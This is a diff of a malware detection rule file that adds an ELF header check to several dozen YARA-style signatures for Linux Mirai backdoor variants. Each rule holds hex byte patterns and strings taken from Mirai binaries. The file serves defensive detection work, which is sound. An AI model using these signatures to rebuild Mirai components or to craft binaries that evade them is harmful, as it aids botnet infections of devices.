         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8620,6 +8986,7 @@ rule Backdoor_Linux_Mirai_KC_2147924866_0
         $n_5_3 = {80 00 c3 8f 00 00 35 8e 44 00 d9 8f 18 00 75 00 00 00 e2 8e 64 00 34 8f 48 00 c5 8f 4c 00 d9 8f 12 80 00 00 21 80 70 02 00 19 10 00 80 80 10 00 21 80 03 02 09 f8 20 03 21 80 02 02 21 18 40 00 10 00 dc 8f 00 00 02 ae 34 00 c2 8f 00 00 00 00 0c 00 40 10 c0 10 15 00 08 00 89 26 21 48 22 01 00 00 26 8d 04 00 27 8d 21 10 c3 00 21 28 00 00 2b 40 46 00 21 18 e5 00 21 18 03 01 00 00 22 ad 04 00 23 ad}  //weight: -5, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (not (any of ($n*))) and
         (all of ($x*))
 }
@@ -8643,6 +9010,7 @@ rule Backdoor_Linux_Mirai_KB_2147925437_0
         $x_1_2 = {2f 80 00 00 7d 3c d8 50 39 7c 00 01 39 29 ff ff 7f e4 fb 78 7c 7d 5a 14 7c 05 03 78 7f 00 48 40 3b fe 00 01 41 ?? ?? ?? 40 ?? ?? ?? 7c 1d e1 ae 7f 8b 02 14 4b ff 9c 5d 2f 9e 00 00 41 ?? ?? ?? 2f 9f 00 00 38 80 00 2e 7f e3 fb 78}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8668,6 +9036,7 @@ rule Backdoor_Linux_Mirai_JX_2147925722_0
         $x_1_5 = "killer_shoot_list" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8690,6 +9059,7 @@ rule Backdoor_Linux_Mirai_KE_2147926127_0
         $x_1_2 = {0f 00 00 e2 57 0e 80 e2 08 00 80 e2 00 08 a0 e1 20 34 a0 e1 ff 3c 03 e2 20 3c 83 e1 04 20 a0 e3 ba 32 c8 e1 2c 20 c8 e5 08 30 a0 e3 0a 20 a0 e3 2e 30 c8 e5 2f 20 c8 e5 2d 50 c8 e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8712,6 +9082,7 @@ rule Backdoor_Linux_Mirai_KM_2147926257_0
         $x_1_2 = {80 1f 00 00 7f 84 00 00 40 bc 00 14 80 7f 00 04 4b ff ff c1 90 7f 00 04 48 00 00 14}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8734,6 +9105,7 @@ rule Backdoor_Linux_Mirai_KM_2147926257_1
         $x_1_2 = {4b 4c 46 4d 55 51 02 6c 76 02 14 0c 13 19 02 75 6d 75 14 16 0b 02 63 52 52 4e 47 75 47 40 69 4b 56 0d 17 11 15 0c 11 14 02 0a 69 6a 76 6f 6e 0e 02 4e 4b 49 47 02 65 47 41 49 4d 0b 02 61 4a 50 4d 4f 47 0d 17 13 0c}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8756,6 +9128,7 @@ rule Backdoor_Linux_Mirai_KG_2147926540_0
         $x_1_2 = {20 d0 0b 40 09 00 f8 7f 00 e1 12 20 0c e0 a2 2f fc 01 f6 56 1c 65 1b d1 b1 1f f4 57 0b 41 83 64 08 7f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8778,6 +9151,7 @@ rule Backdoor_Linux_Mirai_KG_2147926540_1
         $x_1_2 = {34 40 9f e5 03 c0 80 e0 02 00 a0 e1 2c 30 9f e5 2c 20 9f e5 04 40 8f e0 03 30 84 e0 02 20 84 e0 08 c0 8d e5 18 00 00 eb 14 00 9d e5 18 d0 8d e2 10 40 bd e8 1e ff 2f e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8800,6 +9174,7 @@ rule Backdoor_Linux_Mirai_KD_2147928897_0
         $x_1_2 = {00 00 28 21 02 a0 c8 21 03 20 f8 09 02 e0 20 21 8f bc 00 18 02 20 c8 21 03 20 f8 09 00 00 00 00 3c 04 80 00 34 84 80 01 00 44 00 18 00 02 27 c3 8f bc 00 18 02 20 c8 21 a7 b6 00 32 00 00 18 10 00 62 18 21}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8822,6 +9197,7 @@ rule Backdoor_Linux_Mirai_KI_2147930756_0
         $x_1_2 = {03 20 f8 09 00 00 00 00 3c 04 80 80 34 84 80 81 00 44 00 18 00 02 2f c3 8f bc 00 18 8f a6 00 38 02 a0 20 21 03 c0 c8 21 00 00 18 10 00 62 18 21 00 03 19 c3 00 65 18 23 00 03 2a 00 00 a3 28 23 03 20 f8 09 00 45 28 23 8f bc 00 18 16 c0 00 3e a6 00 00 02 02 00 28 21 02 40 20 21 00 00 30 21}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8847,6 +9223,7 @@ rule Backdoor_Linux_Mirai_KO_2147931669_0
         $x_1_5 = "kill_process_by_inode" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8869,6 +9246,7 @@ rule Backdoor_Linux_Mirai_KN_2147931806_0
         $x_1_2 = {81 28 00 00 80 47 00 00 25 03 ff bf 30 63 00 ff 24 e2 ff bf 30 42 00 ff 2c 63 00 1a 24 a5 ff ff 25 29 00 01 10 ?? ?? ?? 2c 42 00 1a 35 08 00 60 10 ?? ?? ?? 00 00 00 00 34 e7 00 60 11 ?? ?? ?? 25 4a 00 01 00 00 50 21}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8891,6 +9269,7 @@ rule Backdoor_Linux_Mirai_KJ_2147931906_0
         $x_1_2 = {14 20 90 e5 30 40 2d e9 40 20 81 e5 0c 30 90 e5 00 00 53 e3 04 d0 4d e2 00 40 a0 e1 01 50 a0 e1 0e 00 00 1a 02 00 a0 e3 04 10 a0 e1 05 20 a0 e1 10 c0 94 e5 0f e0 a0 e1 1c ff 2f e1 07 00 50 e3 04 00 00 0a 08 00 50 e3 86 ec ff 1b 04 00 a0 e1 05 10 a0 e1 d1 ff ff eb}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8913,6 +9292,7 @@ rule Backdoor_Linux_Mirai_QK_2147932204_0
         $x_1_2 = {e8 ea fb 8f 80 c8 ca c0 c6 df 80 90 cd ce dd ca 8f e7 fb fb ff 80 9e 81 9f a2 a5 ec c0 c1 c1 ca cc db c6 c0 c1 95 8f cc c3 c0 dc ca a2 a5 a2 a5 a2 af 00 00 71 6a 79 76 71 6b 6c 6a 79 6b 70 36 74 71 7a 6a 7d 64 7b 70 6d 6a 7b 70 77 7e 70 77 74 74 61 6f 77 77 7c 36 74 71 7a 6a 7d 64 71 7f 6d 7d 6b 6b 71 75 70 7d 6a 7d 36 74 71 7a 6a 7d 18}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8935,6 +9315,7 @@ rule Backdoor_Linux_Mirai_KP_2147933111_0
         $x_1_2 = {40 30 9f e5 05 00 a0 e1 00 20 93 e5 3c 10 9f e5 01 3a a0 e3 94 ff ff eb 01 10 a0 e3 00 40 a0 e1 2c 30 9f e5 0d 00 a0 e1 0f e0 a0 e1 03 f0 a0 e1 04 00 a0 e1 10 d0 8d e2}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8957,6 +9338,7 @@ rule Backdoor_Linux_Mirai_KR_2147935670_0
         $x_1_2 = {f0 47 2d e9 41 de 4d e2 08 d0 4d e2 4a 6f 8d e2 00 50 a0 e1 88 20 a0 e3 00 10 a0 e3 06 00 a0 e1 69 02 00 eb 01 40 a0 e3 00 30 e0 e3 b0 a1 9f e5 24 41 8d e5 10 30 8d e5 0f 05 00 eb 00 00 55 e3 0a a0 8f e0 04 00 a0 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -8979,6 +9361,7 @@ rule Backdoor_Linux_Mirai_KK_2147935857_0
         $x_1_2 = {e1 03 14 2a e0 03 02 aa d5 01 00 94 60 ff ff b5 e0 03 13 aa f3 53 41 a9 fd 7b c2 a8 c0 03 5f d6}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -9001,6 +9384,7 @@ rule Backdoor_Linux_Mirai_KS_2147936158_0
         $x_1_2 = {45 00 a2 93 ff ff 84 34 01 00 42 30 01 00 03 24 45 00 a2 a3 3c 00 a4 af f0 00 a4 af f4 00 a3 a3 f5 00 a0 a3 a4 85 82 8f 00 00 03 92 00 00 44 8c 40 10 03 00 21 10 44 00 00 00 42 94 00 00 00 00 20 00 42 30 0e 00 40 10 25 00 02 24}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -9024,6 +9408,7 @@ rule Backdoor_Linux_Mirai_KT_2147936159_0
         $x_1_3 = {10 40 2d e9 02 00 90 ef 01 0a 70 e3 00 40 a0 e1 03 00 00 9a 85 02 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -9047,6 +9432,7 @@ rule Backdoor_Linux_Mirai_KU_2147936163_0
         $x_1_3 = {21 3c 83 e1 b4 30 c6 e1 b2 00 c6 e1 01 70 87 e2 18 a0 8a e2 14 00 9d e5 00 00 57 e1 96 ff ff 1a 34 10 9d e5 00 a0 a0 e3 08 10 81 e2 10 10 8d e5}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -9069,6 +9455,7 @@ rule Backdoor_Linux_Mirai_KW_2147937474_0
         $x_1_2 = {5f 00 00 6b 4a fc ff 54 24 68 60 38 23 68 62 38 24 68 22 38 42 04 00 91 23 68 20 38 00 04 00 d1 f8 ff ff 17}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -9091,6 +9478,7 @@ rule Backdoor_Linux_Mirai_KV_2147937877_0
         $x_1_2 = {21 10 0b 01 24 18 4f 00 06 00 61 04 21 58 60 00 ff ff 63 24 00 ff 02 24 25 18 62 00 01 00 63 24 21 58 60 00 21 18 83 00 00 00 62 90 00 00 00 00 00 00 22 a1 00 00 68 a0 00 00 22 91 00 00 a3 91 21 10 48 00 ff 00 42 30 21 10 82 00 00 00 42 90 00 00 00 00 26 10 43 00 00 00 c2 a1 01 00 82 25 ff 00 4c 30 2a 10 47 01 21 68 aa 00 21 70 ca 00 21 48 8c 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -9113,6 +9501,7 @@ rule Backdoor_Linux_Mirai_KY_2147939801_0
         $x_1_2 = {82 03 00 00 00 00 00 00 10 60 00 03 24 02 00 25 14 62 ff fa 00 00 00 00 12 04 00 0c 02 04 88 23 1e 20 00 03 02 20 28 21 10 00 00 06 00 00 10 21 8f 99 83 6c 00 00 00 00 03 20 f8 09 02 c0 30 21 8f bc 00 18}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -9135,6 +9524,7 @@ rule Backdoor_Linux_Mirai_KZ_2147942307_0
         $x_1_2 = {0e 20 c7 e7 0c 30 d7 e7 03 20 22 e0 0c 20 c7 e7 b5 3f 8d e2 0e 10 83 e0 c0 22 51 e5 c0 32 50 e5 02 30 83 e0 ff 30 03 e2 b5 1f 8d e2 03 20 81 e0 c0 12 52 e5 05 30 d4 e7 01 30 23 e0 05 30 c4 e7 01 40 84 e2 04 00 56 e1}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -9157,6 +9547,7 @@ rule Backdoor_Linux_Mirai_LE_2147946128_0
         $x_1_2 = {58 82 99 8f d4 10 a4 8f 09 f8 20 03 00 00 00 00 d4 10 a4 8f bc 08 a3 97 21 10 82 00 05 00 46 24 c0 10 a2 8f 18 00 bc 8f d5 ff ?? ?? ?? b0 80 00 c2 08 a3 97}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
